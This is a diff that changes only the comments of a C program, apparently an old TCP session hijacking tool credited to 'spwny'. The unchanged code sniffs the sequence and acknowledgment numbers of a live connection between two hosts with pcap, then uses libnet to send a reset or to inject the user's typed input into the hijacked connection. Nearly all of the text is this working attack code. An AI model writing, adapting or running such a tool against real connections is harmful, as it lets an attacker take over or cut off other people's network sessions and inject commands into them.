@@ -1,28 +1,28 @@
-#include <stdio.h> // Include standard input-output library for basic I/O operations
-#include <stdlib.h> // Include standard library for memory allocation and other utilities
-#include <string.h> // Include string manipulation library
-#include <libnet.h> // Include libnet library for network packet construction
-#include <pcap.h> // Include pcap library for packet capturing
-#include <signal.h> // Include signal handling library
-#include <sys/stat.h> // Include system stat library for file status checking
-#include <fcntl.h> // Include file control library for file operations
-#include <sys/time.h> // Include system time library for time-related operations
-#include <unistd.h> // Include POSIX API library for system calls
+#include <stdio.h> // standard input-output library for basic I/O operations
+#include <stdlib.h> // standard library for memory allocation and other utilities
+#include <string.h> // string manipulation library
+#include <libnet.h> // libnet library for network packet construction
+#include <pcap.h> // pcap library for packet capturing
+#include <signal.h> // signal handling library
+#include <sys/stat.h> // system stat library for file status checking
+#include <fcntl.h> // file control library for file operations
+#include <sys/time.h> // system time library for time-related operations
+#include <unistd.h> // POSIX API library for system calls
 
 #define lrandom(min, max) (random()%(max-min)+min) // Define macro for generating random numbers within a range
 
-struct seqack { // Define structure to hold sequence and acknowledgment numbers
-    u_long seq; // Sequence number
-    u_long ack; // Acknowledgment number
+struct seqack { // Define struct
+    u_long seq; // Seq
+    u_long ack; // Ack
 };
 
 void devsrandom(void) { // Function to seed the random number generator
     int fd; // File descriptor
     u_long seed; // Seed for random number generator
 
-    fd = open("/dev/urandom", O_RDONLY); // Open /dev/urandom for reading
+    fd = open("/dev/urandom", O_RDONLY); // Open /dev/urandom read only
     if (fd == -1) { // If failed to open /dev/urandom
-        fd = open("/dev/random", O_RDONLY); // Open /dev/random for reading
+        fd = open("/dev/random", O_RDONLY); // Open /dev/random, read only
         if (fd == -1) { // If failed to open /dev/random
             struct timeval tv; // Structure to hold time value
 
@@ -44,7 +44,7 @@ void getseqack(char *interface, u_long srcip, u_long dstip, u_long sport, u_long
     struct tcphdr tcph; // TCP header structure
     int ethrhdr; // Ethernet header size
 
-    pt = pcap_open_live(interface, 65535, 1, 60, ebuf); // Open live packet capture on specified interface
+    pt = pcap_open_live(interface, 65535, 1, 60, ebuf); // Open live capture on specified interface
     if (!pt) { // If failed to open packet capture handle
         printf("pcap_open_live: %s\n", ebuf); // Print error message
         exit(-1); // Exit program with error
@@ -67,12 +67,12 @@ void getseqack(char *interface, u_long srcip, u_long dstip, u_long sport, u_long
         case DLT_RAW: // RAW
             ethrhdr = 0; // No header size
         default: // Default case
-            printf("pcap_datalink: Can't figure out how big the ethernet header is.\n"); // Print error message
+            printf("pcap_datalink: Can't figure out how big the ethernet header is.\n"); // error msg
             exit(-1); // Exit program with error
     }
 
     printf("Waiting for SEQ/ACK to arrive from the srcip to the dstip.\n"); // Print message
-    printf("(To speed things up, try making some traffic between the two, /msg person asdf\n\n"); // Print message
+    printf("(To speed things up, try making some traffic between the two, /msg person asdf\n\n"); // some more msgs
 
     for (;;) { // Infinite loop
         struct pcap_pkthdr pkthdr; // Packet header structure
@@ -139,39 +139,39 @@ int main(int argc, char *argv[]) {
     signal(SIGTERM, sighandle); // Register signal handler for SIGTERM
     signal(SIGINT, sighandle); // Register signal handler for SIGINT
 
-    if (argc < 6) { // If insufficient command-line arguments
-        printf("Usage: %s <interface> <src ip> <src port> <dst ip> <dst port> [-r]\n", argv[0]); // Print usage message
-        printf("<interface>\t\tThe interface you are going to hijack on.\n"); // Print description
-        printf("<src ip>\t\tThe source ip of the connection.\n"); // Print description
-        printf("<src port>\t\tThe source port of the connection.\n"); // Print description
-        printf("<dst ip>\t\tThe destination IP of the connection.\n"); // Print description
-        printf("<dst port>\t\tThe destination port of the connection.\n"); // Print description
-        printf("[-r]\t\t\tReset the connection rather than hijacking it.\n"); // Print description
-        printf("\nCoded by spwny, Inspiration by cyclozine (http://www.geocities.com/stasikous).\n"); // Print credits
-        exit(-1); // Exit program with error
+    if (argc < 6) { // cmd stuff
+        printf("Usage: %s <interface> <src ip> <src port> <dst ip> <dst port> [-r]\n", argv[0]); 
+        printf("<interface>\t\tThe interface you are going to hijack on.\n");
+        printf("<src ip>\t\tThe source ip of the connection.\n"); 
+        printf("<src port>\t\tThe source port of the connection.\n"); 
+        printf("<dst ip>\t\tThe destination IP of the connection.\n"); 
+        printf("<dst port>\t\tThe destination port of the connection.\n"); 
+        printf("[-r]\t\t\tReset the connection rather than hijacking it.\n"); 
+        printf("\nCoded by spwny, Inspiration by cyclozine (http://www.geocities.com/stasikous).\n");
+        exit(-1); // Exit
     }
 
     if (argv[6] && !strcmp(argv[6], "-r")) // If reset flag present
         reset = 1; // Set reset flag
 
-    srcip = inet_addr(argv[2]); // Convert source IP to network byte order
-    dstip = inet_addr(argv[4]); // Convert destination IP to network byte order
-    sport = atol(argv[3]); // Convert source port to long integer
-    dport = atol(argv[5]); // Convert destination port to long integer
+    srcip = inet_addr(argv[2]); // src IP to network byte order
+    dstip = inet_addr(argv[4]); // dst IP to network byte order
+    sport = atol(argv[3]); // src port to long integer
+    dport = atol(argv[5]); // dst port to long integer
 
     if (!srcip) { // If invalid source IP
-        printf("%s is not a valid ip.\n", argv[2]); // Print error message
+        printf("%s is not a valid ip.\n", argv[2]); // error
         exit(-1); // Exit program with error
     }
     if (!dstip) { // If invalid destination IP
-        printf("%s is not a valid ip.\n", argv[4]); // Print error message
-        exit(-1); // Exit program with error
+        printf("%s is not a valid ip.\n", argv[4]); // error
+        exit(-1); // Exit
     }
     if ((sport > 65535) || (dport > 65535) || (sport < 1) || (dport < 1)) { // If invalid port numbers
-        printf("The valid TCP port range is 1-1024.\n"); // Print error message
-        exit(-1); // Exit program with error
+        printf("The valid TCP port range is 1-1024.\n"); // error
+        exit(-1); // Exit
     }
-    getseqack(ifa, srcip, dstip, sport, dport, &sa); // Obtain sequence and acknowledgment numbers
+    getseqack(ifa, srcip, dstip, sport, dport, &sa); // get swq and ack
 
     if (reset) { // If reset flag set
         sendtcp(srcip, dstip, sport, dport, TH_RST, sa.seq, 0, NULL, 0); // Send TCP RST packet
@@ -187,12 +187,12 @@ int main(int argc, char *argv[]) {
     sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, 1024); // Send TCP ACK packet with 1024 bytes of zero data
     sa.seq += 1024; // Update sequence number
 
-    printf("Starting hijack session, Please use ^C to terminate.\n"); // Print message
-    printf("Anything you enter from now on is sent to the hijacked TCP connection.\n"); // Print message
+    printf("Starting hijack session, Please use ^C to terminate.\n");
+    printf("Anything you enter from now on is sent to the hijacked TCP connection.\n");
 
     while (fgets(buf, sizeof(buf) - 1, stdin)) { // Read user input until EOF
         sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, strlen(buf)); // Send TCP ACK packet with user input
-        sa.seq += strlen(buf); // Update sequence number
+        sa.seq += strlen(buf); // Update seq
         memset(&buf, 0, sizeof(buf)); // Clear buffer
     }
     sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_FIN, sa.seq, sa.ack, NULL, 0); // Send TCP FIN packet
